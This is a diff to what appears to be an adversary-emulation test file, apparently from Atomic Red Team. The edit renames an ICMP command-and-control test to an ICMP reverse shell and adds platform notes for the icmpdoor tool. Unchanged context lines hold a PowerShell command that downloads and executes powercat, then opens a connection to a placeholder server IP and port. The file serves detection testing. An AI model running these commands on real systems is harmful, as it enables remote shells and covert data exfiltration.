@@ -85,7 +85,7 @@ atomic_tests:
       IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')
       powercat -c #{server_ip} -p #{server_port}
     name: powershell
-- name: ICMP C2
+- name: Linux ICMP Reverse Shell using icmp-cnc
   description: |
     ICMP C2 (Command and Control) utilizes the Internet Control Message Protocol (ICMP), traditionally used for network diagnostics, as a covert communication channel for attackers. By using ICMP, adversaries can send commands, exfiltrate data, or maintain access to compromised systems without triggering network detection systems.
     This method allows attackers to communicate and control compromised devices while remaining undetected.
@@ -93,7 +93,8 @@ atomic_tests:
     For more details, check this blog: [ICMP Reverse Shell Blog](https://cryptsus.com/blog/icmp-reverse-shell.html)
 
     **Important Notes:**
-    - Use `[icmp-cnc]` for the C2 server (Attacker) and `[icmpdoor]` for the C2 client (Victim). 
+    - Use `[icmp-cnc]` for the C2 server (Attacker) and `[icmpdoor]` for the C2 client (Victim).
+    - Binaries work on Ubuntu 22.04.5 LTS; for CentOS Stream or other, use the Python file from the GitHub link [https://github.com/krabelize/icmpdoor].
     - Root access is required.
   supported_platforms:
   - linux
